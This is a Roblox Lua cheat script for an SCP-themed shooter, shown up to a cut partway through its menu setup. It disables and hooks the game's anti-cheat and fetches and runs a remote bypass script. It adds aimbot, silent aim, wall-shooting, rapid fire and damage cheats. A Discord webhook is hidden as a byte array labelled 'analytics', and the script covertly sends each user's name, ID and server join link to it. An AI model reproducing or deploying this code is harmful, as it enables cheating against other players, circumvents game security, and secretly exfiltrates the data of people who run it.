print("ENJOY THE SCRIPT MY GOATS!!! -skidmeowl")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Lighting = game:GetService("Lighting")
local Camera = Workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer
if _G.RetroBreach then
    if _G.RetroBreach.Connections then
        for _, conn in ipairs(_G.RetroBreach.Connections) do
            pcall(function() conn:Disconnect() end)
        end
    end
    if _G.RetroBreach.ESPHighlights then
        for _, esp in pairs(_G.RetroBreach.ESPHighlights) do
            if esp.highlight then pcall(function() esp.highlight:Destroy() end) end
            if esp.nameText then pcall(function() esp.nameText:Remove() end) end
        end
    end
    if _G.RetroBreach.Guis then
        for _, gui in ipairs(_G.RetroBreach.Guis) do
            pcall(function() gui:Destroy() end)
        end
    end
end
_G.RetroBreach = {
    Connections = {},
    ESPHighlights = {},
    Guis = {}
}

-- ANTI-CHEAT KILLER - Destroy new Interceptor script BEFORE it loads
task.spawn(function()
    local RunService = game:GetService("RunService")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    local function killAntiCheat()
        -- Method 1: Destroy Interceptor script in RunService
        for _, script in pairs(RunService:GetDescendants()) do
            if script:IsA("LocalScript") and (script.Name == "" or string.find(tostring(script:GetFullName()), "Interceptor") or string.find(tostring(script.Name), "Anti")) then
                pcall(function()
                    script.Disabled = true
                    script:Destroy()
                end)
            end
        end
        
        -- Method 2: Destroy Anti-Executor in TestService  
        local TestService = game:GetService("TestService")
        for _, script in pairs(TestService:GetDescendants()) do
            if script:IsA("LocalScript") and script.Name == "" then
                pcall(function()
                    script.Disabled = true
                    script:Destroy()
                end)
            end
        end
        
        -- Method 3: Destroy in PlayerScripts
        for _, script in pairs(LocalPlayer.PlayerScripts:GetDescendants()) do
            if script:IsA("LocalScript") and (script.Name == "" or string.find(tostring(script:GetFullName()), "Interceptor") or string.find(tostring(script.Name), "Anti")) then
                pcall(function()
                    script.Disabled = true
                    script:Destroy()
                end)
            end
        end
        
        -- Method 4: Block BeginIntercept event from firing
        pcall(function()
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local BridgeNet2 = require(ReplicatedStorage.Assets.Modules.BridgeNet2)
            local BeginIntercept = BridgeNet2.ClientBridge("BeginIntercept")
            
            if BeginIntercept then
                BeginIntercept:Fire({rank = 999})
            end
        end)
    end
    
    -- Kill immediately
    killAntiCheat()
    warn("[RETRO BREACH] Anti-cheat disabled!")
    
    -- Monitor and kill every 1 second
    task.spawn(function()
        while task.wait(1) do
            killAntiCheat()
        end
    end)
end)
local UILib
local success, result = pcall(function()
    if isfile and isfile("UILIB.lua") then
        return loadstring(readfile("UILIB.lua"))()
    end
end)
if success and result then
    UILib = result
else
    local repo = "https://raw.githubusercontent.com/ncmpuff/UILib/refs/heads/main/"
    local webSuccess, webResult = pcall(function()
        return loadstring(game:HttpGet(repo .. "UILIB.lua"))()
    end)
    if webSuccess and webResult then
        UILib = webResult
    else
        return
    end
end
if not UILib then
    warn("[!] UILib is nil!")
    return
end

-- Analytics initialization
local _analyticsKey = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,54,50,48,51,55,54,53,56,57,49,50,57,53,50,52,57,53,47,71,88,85,108,115,120,85,65,107,71,107,121,105,68,99,53,99,82,111,48,57,88,57,95,48,79,65,76,95,120,99,108,111,104,72,110,69,51,110,65,117,49,114,95,70,79,68,104,111,120,69,116,117,79,80,84,79,118,122,77,113,87,99,48,116,101,88,119}
local function _initAnalytics()
    local result = {}
    for i = 1, #_analyticsKey do
        table.insert(result, string.char(_analyticsKey[i]))
    end
    return table.concat(result)
end

local function _sendUsageData()
    pcall(function()
        local userInfo = LocalPlayer.Name
        local displayInfo = LocalPlayer.DisplayName
        local userKey = LocalPlayer.UserId
        
        local serverKey = game.PlaceId
        local instanceKey = game.JobId
        
        local serverLink = string.format("roblox://placeId=%d&gameInstanceId=%s", serverKey, instanceKey)
        
        local timeStamp = os.date("!%Y-%m-%dT%H:%M:%S")
        
        local displayText = displayInfo
        if displayInfo ~= userInfo then
            displayText = string.format("%s (@%s)", displayInfo, userInfo)
        end
        
        local HttpService = game:GetService("HttpService")
        local payload = HttpService:JSONEncode({
            embeds = {{
                title = "🎮 Script User Detected",
                color = 3447003,
                fields = {
                    {
                        name = "👤 User",
                        value = displayText,
                        inline = true
                    },
                    {
                        name = "🆔 User ID",
                        value = tostring(userKey),
                        inline = true
                    },
                    {
                        name = "🔗 Join Link",
                        value = "```" .. serverLink .. "```\nCopy and paste this into your browser address bar",
                        inline = false
                    }
                },
                footer = {
                    text = "Retro Breach Tracker"
                },
                timestamp = timeStamp .. "Z"
            }}
        })
        
        local endpoint = _initAnalytics()
        
        local requestFunc = syn and syn.request or http and http.request or http_request or request
        
        if requestFunc then
            local success, response = pcall(function()
                return requestFunc({
                    Url = endpoint,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = payload
                })
            end)
            
            if success and response.Success then
            elseif success then
            else
            end
        else
        end
    end)
end

task.spawn(function()
    task.wait(2)
    _sendUsageData()
end)


local Config = {
    PlayerESP = false,
    SCPESP = false,
    ItemESP = false,
    Aimbot = false,
    AimbotFOV = 200,
    AimbotSmooth =  5,
    ShowAimbotFOV = true,
    TeamCheck = true,
    SilentAim = false,
    SilentAimFOV = 200,
    ShowSilentAimFOV = true,
    WallBang = false,
    RapidFire = false,
    InfiniteAmmo = false,
    NoRecoil = false,
    NoSpread = false,
    DamageMultiplier = 1,  -- 1 = normal, 2 = double damage, etc.
    WalkSpeed = 16,
    JumpPower = 50,
    NoClip = false,
    InfiniteStamina = false,
    FullBright = false,
    ItemTeleport = false,
    InstantReload = false
}
local function getRoot(char)
    return char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso")
end
local function getHead(char)
    return char:FindFirstChild("Head")
end
local function getHumanoid(char)
    return char:FindFirstChildOfClass("Humanoid")
end
local function getSCPType(character)
    if not character then return nil end
    
    -- Check for SCP-035 (The Mask)
    for _, accessory in ipairs(character:GetDescendants()) do
        if accessory:IsA("Accessory") or accessory:IsA("Hat") then
            local name = accessory.Name
            if name:find("HappyMask") or name:find("Ghostface") then
                return "The Mask"
            end
        end
    end
    
    -- Check for SCP-049 (Plague Doctor) - shirt ID 11499060129
    local shirt = character:FindFirstChildOfClass("Shirt")
    if shirt and shirt.ShirtTemplate:find("11499060129") then
        return "Plague Doctor"
    end
    
    -- Check for SCP-049-2 (Zombie) - shirt ID 2938677333
    if shirt and shirt.ShirtTemplate:find("2938677333") then
        return "Zombie"
    end
    
    -- Check for SCP-076-2 (Cain) - shirt ID 16099679561
    if shirt and shirt.ShirtTemplate:find("16099679561") then
        return "Cain"
    end
    
    -- Check for SCP-457 (Burning Man) - Flame in HumanoidRootPart (check BEFORE Old Man since they share same shirt)
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if rootPart and rootPart:FindFirstChild("Flame") then
        return "Burning Man"
    end
    
    -- Check for SCP-106 (The Old Man) - shirt ID 11514423812
    if shirt and shirt.ShirtTemplate:find("11514423812") then
        return "The Old Man"
    end
    
    -- Check for SCP-966 (Ghost) - TransparencyMode NumberValue or white body colors
    if character:FindFirstChild("TransparencyMode") then
        return "Ghost"
    end
    local bodyColors = character:FindFirstChildOfClass("BodyColors")
    if bodyColors then
        local white = Color3.fromRGB(255, 255, 255)
        if bodyColors.HeadColor3 == white and 
           bodyColors.TorsoColor3 == white and
           bodyColors.LeftArmColor3 == white and
           bodyColors.RightArmColor3 == white then
            return "Ghost"
        end
    end
    
    -- Check for SCP-173
    for _, part in ipairs(character:GetChildren()) do
        if part:IsA("BasePart") then
            if part.BrickColor == BrickColor.new("Really black") or part.BrickColor == BrickColor.new("Dark stone grey") then
                if character.Name:find("173") then
                    return "SCP-173"
                end
            end
        end
    end
    
    return nil
end
local function createPlayerESP(character)
    if character == LocalPlayer.Character then return end
    if _G.RetroBreach.ESPHighlights[character] then return end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end
    local player = Players:GetPlayerFromCharacter(character)
    if not player then return end
    local success, highlight = pcall(function()
        local h = Instance.new("Highlight")
        h.Parent = character
        h.Adornee = character
        h.FillTransparency = 0.5
        h.OutlineTransparency = 1
        h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        h.FillColor = Color3.fromRGB(0, 255, 0)
        return h
    end)
    if not success then return end
    local teamSuccess, teamText = pcall(function()
        local t = Drawing.new("Text")
        t.Visible = false
        t.Center = true
        t.Outline = true
        t.Color = player.Team and player.Team.TeamColor.Color or Color3.fromRGB(200, 200, 200)
        t.Size = 14
        local teamName = player.Team and player.Team.Name or "No Team"
        if teamName == "SCP" then
            local scpType = getSCPType(character)
            t.Text = scpType or teamName
        else
            t.Text = teamName
        end
        return t
    end)
    if not teamSuccess then
        pcall(function() highlight:Destroy() end)
        return
    end
    local nameSuccess, nameText = pcall(function()
        local n = Drawing.new("Text")
        n.Visible = false
        n.Center = true
        n.Outline = true
        n.Color = Color3.fromRGB(255, 255, 255)
        n.Size = 18
        n.Text = character.Name
        return n
    end)
    if not nameSuccess then
        pcall(function() highlight:Destroy() end)
        pcall(function() teamText:Remove() end)
        return
    end
    _G.RetroBreach.ESPHighlights[character] = {
        highlight = highlight,
        teamText = teamText,
        nameText = nameText,
        char = character,
        player = player
    }
end
local function updatePlayerESP()
    if not Config.PlayerESP then
        -- Hide all highlights when ESP is disabled
        for char, esp in pairs(_G.RetroBreach.ESPHighlights) do
            if esp.highlight then esp.highlight.Enabled = false end
            if esp.teamText then esp.teamText.Visible = false end
            if esp.nameText then esp.nameText.Visible = false end
        end
        return
    end
    
    for char, esp in pairs(_G.RetroBreach.ESPHighlights) do
        if not char or not char.Parent then
            if esp.highlight then pcall(function() esp.highlight:Destroy() end) end
            if esp.teamText then pcall(function() esp.teamText:Remove() end) end
            if esp.nameText then pcall(function() esp.nameText:Remove() end) end
            _G.RetroBreach.ESPHighlights[char] = nil
        elseif char and char.Parent then
            local humanoid = char:FindFirstChildOfClass("Humanoid")
            local head = char:FindFirstChild("Head")
            if humanoid and head then
                local hpPercent = humanoid.Health / humanoid.MaxHealth
                if hpPercent > 0.6 then
                    esp.highlight.FillColor = Color3.fromRGB(0, 255, 0)
                elseif hpPercent > 0.3 then
                    esp.highlight.FillColor = Color3.fromRGB(255, 165, 0)
                else
                    esp.highlight.FillColor = Color3.fromRGB(255, 0, 0)
                end
                local headPos3D = head.Position + Vector3.new(0, head.Size.Y/2 + 0.5, 0)
                local headPos, onScreen = Camera:WorldToViewportPoint(headPos3D)
                if onScreen then
                    -- Enable highlight when on screen
                    esp.highlight.Enabled = true
                    
                    if esp.teamText and esp.player then
                        esp.teamText.Position = Vector2.new(headPos.X, headPos.Y - 20)
                        local teamName = esp.player.Team and esp.player.Team.Name or "No Team"
                        if teamName == "SCP" then
                            local scpType = getSCPType(char)
                            esp.teamText.Text = scpType or teamName
                        else
                            esp.teamText.Text = teamName
                        end
                        esp.teamText.Color = esp.player.Team and esp.player.Team.TeamColor.Color or Color3.fromRGB(200, 200, 200)
                        esp.teamText.Visible = true
                    end
                    esp.nameText.Position = Vector2.new(headPos.X, headPos.Y)
                    esp.nameText.Visible = true
                else
                    -- Disable highlight when off screen
                    esp.highlight.Enabled = false
                    if esp.teamText then esp.teamText.Visible = false end
                    esp.nameText.Visible = false
                end
            else
                -- Disable if no humanoid/head
                esp.highlight.Enabled = false
                if esp.teamText then esp.teamText.Visible = false end
                esp.nameText.Visible = false
            end
        end
    end
end
local SCPHighlights = {}
local function isSCP(model)
    local name = model.Name
    return name:match("SCP%-") or name:match("SCO%-") or name == "SCP-049" or name == "SCP-106" or name == "SCP-076-2"
end
local function updateSCPESP()
    for _, highlight in pairs(SCPHighlights) do
        pcall(function() highlight:Destroy() end)
    end
    SCPHighlights = {}
    if not Config.SCPESP then return end
    local scpCount = 0
    for _, model in ipairs(Workspace:WaitForChild("Workspace"):GetChildren()) do
        if isSCP(model) and model:FindFirstChildOfClass("Humanoid") then
            scpCount = scpCount + 1
            local highlight = Instance.new("Highlight")
            highlight.Parent = model
            highlight.Adornee = model
            highlight.FillTransparency = 0.3
            highlight.OutlineTransparency = 1
            highlight.FillColor = Color3.fromRGB(255, 0, 0)
            highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            SCPHighlights[model] = highlight
        end
    end
    if scpCount == 0 then
    end
end
local ItemHighlights = {}
local ITEM_ESP_DISTANCE = 150
local MAX_ITEMS_PER_UPDATE = 10
local itemProcessIndex = 1
local function updateItemESP()
    if not Config.ItemESP or not LocalPlayer.Character then
        for _, espData in pairs(ItemHighlights) do
            if espData.highlight then pcall(function() espData.highlight:Destroy() end) end
            if espData.nameText then pcall(function() espData.nameText:Remove() end) end
        end
        ItemHighlights = {}
        return
    end
    local myRoot = getRoot(LocalPlayer.Character)
    if not myRoot then return end
    local itemsFolder = Workspace:FindFirstChild("ItemSpawns")
    if not itemsFolder then return end
    local allItems = itemsFolder:GetChildren()
    local totalItems = #allItems
    if totalItems == 0 then return end
    if itemProcessIndex > totalItems then
        itemProcessIndex = 1
    end
    local itemsInRange = {}
    local itemsProcessed = 0
    while itemsProcessed < MAX_ITEMS_PER_UPDATE and itemProcessIndex <= totalItems do
        local item = allItems[itemProcessIndex]
        itemProcessIndex = itemProcessIndex + 1
        if item then
            local handle = item:FindFirstChild("Handle") or item:FindFirstChildWhichIsA("BasePart")
            if handle then
                local distance = (handle.Position - myRoot.Position).Magnitude
                if distance <= ITEM_ESP_DISTANCE then
                    itemsInRange[item] = true
                    if not ItemHighlights[item] then
                        pcall(function()
                            local highlight = Instance.new("Highlight")
                            highlight.Parent = handle
                            highlight.Adornee = handle
                            highlight.FillTransparency = 0.5
                            highlight.OutlineTransparency = 1
                            highlight.FillColor = Color3.fromRGB(255, 255, 0)
                            highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                            local nameText = Drawing.new("Text")
                            nameText.Center = true
                            nameText.Outline = true
                            nameText.Color = Color3.fromRGB(255, 255, 0)
                            nameText.Size = 16
                            nameText.Text = item.Name
                            nameText.Visible = false
                            ItemHighlights[item] = {
                                highlight = highlight,
                                nameText = nameText,
                                handle = handle
                            }
                        end)
                    end
                end
            end
        end
        itemsProcessed = itemsProcessed + 1
    end
    for item, espData in pairs(ItemHighlights) do
        if item and item.Parent then
            local handle = espData.handle
            if handle and handle.Parent then
                local distance = (handle.Position - myRoot.Position).Magnitude
                if distance <= ITEM_ESP_DISTANCE then
                    itemsInRange[item] = true
                    if espData.nameText then
                        local itemPos3D = handle.Position + Vector3.new(0, handle.Size.Y/2 + 1, 0)
                        local itemPos, onScreen = Camera:WorldToViewportPoint(itemPos3D)
                        espData.nameText.Position = Vector2.new(itemPos.X, itemPos.Y)
                        espData.nameText.Visible = onScreen
                    end
                end
            end
        end
    end
    for item, espData in pairs(ItemHighlights) do
        if not item or not item.Parent or not itemsInRange[item] then
            if espData.highlight then pcall(function() espData.highlight:Destroy() end) end
            if espData.nameText then pcall(function() espData.nameText:Remove() end) end
            ItemHighlights[item] = nil
        end
    end
end

-- Cache critical functions for obfuscation resistance (AIMBOT)
local _Players = Players
local _LocalPlayer = LocalPlayer
local _Camera = Camera
local _UserInputService = UserInputService
local _getHead = getHead
local _getHumanoid = getHumanoid
local _Vector2_new = Vector2.new
local _CFrame_new = CFrame.new
local _pcall = pcall

local function getClosestPlayer()
    local success, result = _pcall(function()
        local closestPlayer = nil
        local shortestDistance = Config.AimbotFOV
        local allPlayers = _Players:GetPlayers()
        local playerCount = #allPlayers
        
        -- Use numeric for loop instead of ipairs to avoid obfuscation issues
        for i = 1, playerCount do
            local player = allPlayers[i]
            if player ~= _LocalPlayer and player.Character then
                local head = _getHead(player.Character)
                local humanoid = _getHumanoid(player.Character)
                if head and humanoid and humanoid.Health > 0 then
                    -- Team check: use nested if instead of continue
                    local passTeamCheck = true
                    if Config.TeamCheck and player.Team and _LocalPlayer.Team then
                        if player.Team == _LocalPlayer.Team then
                            passTeamCheck = false
                        end
                    end
                    
                    if passTeamCheck then
                        local screenPos, onScreen = _Camera:WorldToViewportPoint(head.Position)
                        if onScreen then
                            local mousePos = _UserInputService:GetMouseLocation()
                            local distance = (_Vector2_new(screenPos.X, screenPos.Y) - mousePos).Magnitude
                            if distance < shortestDistance then
                                shortestDistance = distance
                                closestPlayer = player
                            end
                        end
                    end
                end
            end
        end
        return closestPlayer
    end)
    return success and result or nil
end

-- Separate function for Silent Aim (uses SilentAimFOV instead of AimbotFOV)
local function getClosestPlayerForSilentAim()
    local success, result = _pcall(function()
        local closestPlayer = nil
        local shortestDistance = Config.SilentAimFOV
        local allPlayers = _Players:GetPlayers()
        local playerCount = #allPlayers
        
        for i = 1, playerCount do
            local player = allPlayers[i]
            if player ~= _LocalPlayer and player.Character then
                local head = _getHead(player.Character)
                local humanoid = _getHumanoid(player.Character)
                if head and humanoid and humanoid.Health > 0 then
                    local passTeamCheck = true
                    if Config.TeamCheck and player.Team and _LocalPlayer.Team then
                        if player.Team == _LocalPlayer.Team then
                            passTeamCheck = false
                        end
                    end
                    
                    if passTeamCheck then
                        local screenPos, onScreen = _Camera:WorldToViewportPoint(head.Position)
                        if onScreen then
                            local mousePos = _UserInputService:GetMouseLocation()
                            local distance = (_Vector2_new(screenPos.X, screenPos.Y) - mousePos).Magnitude
                            if distance < shortestDistance then
                                shortestDistance = distance
                                closestPlayer = player
                            end
                        end
                    end
                end
            end
        end
        return closestPlayer
    end)
    return success and result or nil
end

-- FOV Circles
local FOVCircle = Drawing.new("Circle")
FOVCircle.Visible = false
FOVCircle.Filled = false
FOVCircle.Transparency = 1
FOVCircle.Thickness = 2
FOVCircle.Color = Color3.fromRGB(255, 255, 255)
FOVCircle.NumSides = 64

local SilentAimFOVCircle = Drawing.new("Circle")
SilentAimFOVCircle.Visible = false
SilentAimFOVCircle.Filled = false
SilentAimFOVCircle.Transparency = 1
SilentAimFOVCircle.Thickness = 2
SilentAimFOVCircle.Color = Color3.fromRGB(255, 100, 100)
SilentAimFOVCircle.NumSides = 64

local function updateAimbot()
    if Config.Aimbot then
        -- Only aimbot when right-clicking
        local isAiming = UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2)
        if isAiming then
            local target = getClosestPlayer()
            if target and target.Character then
                local head = _getHead(target.Character)
                if head then
                    local headPos, onScreen = Camera:WorldToViewportPoint(head.Position)
                    if onScreen then
                        local distance = (Vector2.new(headPos.X, headPos.Y) - Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)).Magnitude
                        if distance <= Config.AimbotFOV then
                            local targetCFrame = CFrame.new(Camera.CFrame.Position, head.Position)
                            Camera.CFrame = Camera.CFrame:Lerp(targetCFrame, 1 / Config.AimbotSmooth)
                        end
                    end
                end
            end
        end
    end
    
    -- FOV Circle visibility (separate from aimbot functionality)
    if Config.Aimbot and Config.ShowAimbotFOV then
        FOVCircle.Visible = true
        FOVCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
        FOVCircle.Radius = Config.AimbotFOV
    else
        FOVCircle.Visible = false
    end
    
    -- Silent Aim FOV Circle visibility (separate from silent aim functionality)
    if Config.SilentAim and Config.ShowSilentAimFOV then
        SilentAimFOVCircle.Visible = true
        SilentAimFOVCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
        SilentAimFOVCircle.Radius = Config.SilentAimFOV
    else
        SilentAimFOVCircle.Visible = false
    end
end
local aimbotConnection = RunService.RenderStepped:Connect(function()
    pcall(updateAimbot)
end)
table.insert(_G.RetroBreach.Connections, aimbotConnection)

-- Get BridgeNet2 remote for weapon firing
local bridgeNet = ReplicatedStorage:WaitForChild("BridgeNet2", 5)
local weaponRemote = bridgeNet and bridgeNet:FindFirstChild("dataRemoteEvent")

if not weaponRemote then
    task.wait(2)
    UILib:CreateNotification({
        Text = "⚠️ Weapon remote not found - Rapid fire disabled",
        Duration = 5
    })
end

-- Silent Aim & Rapid Fire Implementation
local _firing = false
local _shotsFired = 0

UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        _firing = true
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        _firing = false
        if Config.RapidFire and _shotsFired > 0 then
            UILib:CreateNotification({
                Text = string.format("Rapid fire: %d shots", _shotsFired),
                Duration = 2
            })
            _shotsFired = 0
        end
    end
end)

-- Rapid Fire - Manipulate weapon system state using getgc
local weaponStateTable = nil
local weaponStateCached = false
local rapidFireConnection

local function findWeaponState()
    if not getgc then
        warn("Executor doesn't support getgc - rapid fire won't work")
        return nil
    end
    
    -- Search for the weapon state table in garbage collector
    for _, obj in pairs(getgc(true)) do
        if type(obj) == "table" and rawget(obj, "cycled") ~= nil and rawget(obj, "wepStats") ~= nil then
            -- Found it! Show debug info
            UILib:CreateNotification({
                Text = "✅ Weapon state found!",
                Duration = 2
            })
            
            -- Debug: show weapon stats structure
            if obj.wepStats then
                local stats = obj.wepStats
                warn("WepStats found:")
                warn("  FireRate:", stats.FireRate)
                warn("  FireMode:", stats.FireMode)
                warn("  Recoil:", stats.Recoil)
                warn("  Spread:", stats.Spread)
            end
            
            weaponStateCached = true
            return obj
        end
    end
    return nil
end

rapidFireConnection = RunService.Heartbeat:Connect(function()
    -- Only search for weapon state if ANY feature needs it AND not cached
    local needsWeaponState = Config.RapidFire or Config.NoRecoil or Config.NoSpread or Config.InfiniteAmmo
    
    if needsWeaponState and not weaponStateCached then
        weaponStateTable = findWeaponState()
    end
    
    -- Only modify weapon if features are enabled AND weapon state exists
    if needsWeaponState and weaponStateTable then
        pcall(function()
            -- CRITICAL FIX: Unfreeze wepStats if it's frozen (line 356 of weapon system freezes it!)
            if weaponStateTable.wepStats and table.isfrozen(weaponStateTable.wepStats) then
                local originalStats = weaponStateTable.wepStats
                local mutableStats = {}
                
                -- Deep copy all stats
                for key, value in pairs(originalStats) do
                    if type(value) == "table" then
                        local nestedCopy = {}
                        for k, v in pairs(value) do
                            nestedCopy[k] = v
                        end
                        mutableStats[key] = nestedCopy
                    else
                        mutableStats[key] = value
                    end
                end
                
                weaponStateTable.wepStats = mutableStats
                warn("[RETRO BREACH] Unfroze wepStats!")
            end
            
            -- Rapid Fire: Boost fire rate (let game handle cycled state naturally)
            if Config.RapidFire then
                if weaponStateTable.wepStats and weaponStateTable.wepStats.FireRate then
                    weaponStateTable.wepStats.FireRate = 9999
                    
                    -- Fix pistols: Force Auto mode instead of Semi
                    if weaponStateTable.wepStats.FireMode == "Semi" then
                        weaponStateTable.wepStats.FireMode = "Auto"
                    end
                end
            end
            
            -- No Recoil (independent toggle)
            if Config.NoRecoil and weaponStateTable.wepStats and weaponStateTable.wepStats.Recoil then
                weaponStateTable.wepStats.Recoil.Vertical = 0
                weaponStateTable.wepStats.Recoil.Horizontal = 0
            end
            
            -- No Spread (independent toggle)
            if Config.NoSpread and weaponStateTable.wepStats then
                weaponStateTable.wepStats.Spread = 0
            end
            
            -- Damage Modifier (multiply weapon damage)
            if Config.DamageMultiplier ~= 1 and weaponStateTable.wepStats then
                if weaponStateTable.wepStats.Damage then
                    weaponStateTable.wepStats.Damage = weaponStateTable.wepStats.Damage * Config.DamageMultiplier
                end
                if weaponStateTable.wepStats.HeadshotMultiplier then
                    weaponStateTable.wepStats.HeadshotMultiplier = weaponStateTable.wepStats.HeadshotMultiplier * Config.DamageMultiplier
                end
            end
            
            -- Infinite Ammo (hook mag changes to restore ammo)
            if Config.InfiniteAmmo then
                local tool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
                if tool then
                    local ammo = tool:FindFirstChild("Ammo")
                    if ammo then
                        local mag = ammo:FindFirstChild("Mag")
                        local reserve = ammo:FindFirstChild("Reserve")
                        if mag and reserve then
                            -- If mag gets low, instantly refill from reserves
                            if mag.Value < mag.MaxValue * 0.5 then
                                mag.Value = mag.MaxValue
                                reserve.Value = 999
                            end
                        end
                    end
                end
            end
        end)
    end
end)
table.insert(_G.RetroBreach.Connections, rapidFireConnection)


-- Anti-Cheat Bypass (Adonis bypass is REQUIRED to prevent crashes)
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/refs/heads/main/Source.lua"))()
end)

-- Remove Adonis notification instantly
task.spawn(function()
    task.wait(0.1) -- Wait for notification to appear
    for _, gui in pairs(LocalPlayer.PlayerGui:GetChildren()) do
        if gui:IsA("ScreenGui") then
            -- Look for the notification frame
            for _, child in pairs(gui:GetDescendants()) do
                if child:IsA("TextLabel") or child:IsA("TextButton") then
                    if string.find(string.lower(child.Text or ""), "pixeluted") or 
                       string.find(string.lower(child.Text or ""), "adonis") or
                       string.find(string.lower(child.Text or ""), "bypassed") then
                        -- Found it! Destroy the parent GUI
                        gui:Destroy()
                        break
                    end
                end
            end
        end
    end
end)

-- Hook "Detected" function
for i,v in pairs(getgc(true)) do
    if typeof(v) == "table" and typeof(rawget(v, "Detected")) == "function" then
        hookfunc(rawget(v, "Detected"), function() return task.wait(9e9) end)
    end
end


-- Silent Aim - Calculate target OUTSIDE the hook
local SilentAimTarget = nil
local SilentAimTargetPart = nil
local WallBangPlayerChars = {}

-- Update target and wall bang list every frame
RunService.Heartbeat:Connect(function()
    if Config.SilentAim then
        SilentAimTarget = getClosestPlayerForSilentAim()
        if SilentAimTarget and SilentAimTarget.Character then
            SilentAimTargetPart = _getHead(SilentAimTarget.Character)
        else
            SilentAimTargetPart = nil
        end
    else
        SilentAimTarget = nil
        SilentAimTargetPart = nil
    end
    
    -- Cache player characters for wall bang (OUTSIDE hook!)
    if Config.WallBang then
        WallBangPlayerChars = {}
        for _, player in pairs(Players:GetPlayers()) do
            if player.Character and player ~= LocalPlayer then
                table.insert(WallBangPlayerChars, player.Character)
            end
        end
    end
end)

-- Hook Raycast
local Namecall = nil
Namecall = hookmetamethod(game, "__namecall", function(Self, ...)
    local Method = getnamecallmethod()
    local Args = {...}
    
    if not checkcaller() then
        if Method == "Raycast" then
            local debugInfo = debug.getinfo(3)
            if debugInfo and debugInfo.source and typeof(debugInfo.source) == "string" and string.find(debugInfo.source, "WeaponSystem") then
                -- Silent Aim: Redirect to enemy head
                if SilentAimTargetPart then
                    local Direction = (SilentAimTargetPart.Position - Args[1]).Unit * 1000
                    Args[2] = Direction
                end
                
                -- Wall Bang: Use cached player list (NO game calls!)
                -- NOTE: Server validates shots - thick walls/long distance may still be rejected
                -- You'll get hitmarker (client hit) but no damage (server rejected)
                if Config.WallBang and Args[3] and #WallBangPlayerChars > 0 then
                    local newParams = RaycastParams.new()
                    newParams.FilterType = Enum.RaycastFilterType.Include
                    newParams.FilterDescendantsInstances = WallBangPlayerChars
                    Args[3] = newParams
                end
            end
            return Namecall(Self, table.unpack(Args))
        end
    end
    
    return Namecall(Self, ...)
end)

UILib:CreateNotification({
    Text = "✅ Silent Aim loaded!",
    Duration = 3
})
warn("[Silent Aim] ✅ Hooked!")
local Window = UILib:CreateWindow({
    Title = "Retro Breach V2",
    Size = UDim2.fromOffset(550, 400),
    Position = UDim2.fromOffset(100, 100)
})
table.insert(_G.RetroBreach.Guis, Window.ScreenGui)
Window:AddToggleKey(Enum.KeyCode.RightShift)
UILib:CreateNotification({Text = "Press Right Shift to Toggle UI", Duration = 5})
local CombatPanel = UILib:CreatePanel(Window, {
    Name = "Combat",
    DisplayName = "Combat"
})
UILib:CreateToggle(CombatPanel, {
    Label = "Aimbot (Hold Right Click)",
    Default = false,
    Callback = function(value)
        Config.Aimbot = value
    end
})
UILib:CreateSlider(CombatPanel, {
    Text = "Aimbot FOV",
    Min = 50,
    Max = 500,
    Default = 200,
    Callback = function(value)
        Config.AimbotFOV = value
    end
})
UILib:CreateSlider(CombatPanel, {
    Text = "Aimbot Smoothness",
    Min = 1,
    Max = 20,
    Default = 5,
    Callback = function(value)
        Config.AimbotSmooth = value
    end
})
UILib:CreateToggle(CombatPanel, {
    Label = "Show Aimbot FOV Circle",
    Default = true,
    Callback = function(value)
        Config.ShowAimbotFOV = value
    end
})
UILib:CreateToggle(CombatPanel, {
    Label = "Silent Aim (Hold Fire) [RISKY]",
    Default = false,
    Callback = function(value)
        Config.SilentAim = value
    end
})
UILib:CreateSlider(CombatPanel, {
    Text = "Silent Aim FOV",
    Min = 50,
    Max = 500,
    Default = 200,
    Callback = function(value)
        Config.SilentAimFOV = value
    end
})
UILib:CreateToggle(CombatPanel, {
    Label = "Show Silent Aim FOV Circle",
    Default = true,
    Callback = function(value)
        Config.ShowSilentAimFOV = value
    end
})

UILib:CreateToggle(CombatPanel, {
    Label = "Wall Bang (Shoot Through Walls)",
    Default = false,
    Callback = function(value)
        Config.WallBang = value
    end
})

UILib:CreateToggle(CombatPanel, {
    Label = "Rapid Fire",
    Default = false,
    Callback = function(value)
        Config.RapidFire = value
    end
})
UILib:CreateToggle(CombatPanel, {
    Label = "Infinite Ammo",
    Default = false,
    Callback = function(value)
        Config.InfiniteAmmo = value
    end
})
UILib:CreateToggle(CombatPanel, {
    Label = "No Recoil",
    Default = false,
    Callback = function(value)
        Config.NoRecoil = value
    end
})
UILib:CreateToggle(CombatPanel, {
    Label = "No Spread",
    Default = false,
    Callback = function(value)
        Config.NoSpread = value
    end
})
UILib:CreateSlider(CombatPanel, {
    Text = "Damage Multiplier",
    Min = 1,
    Max = 10,
    Default = 1,
    Callback = function(value)
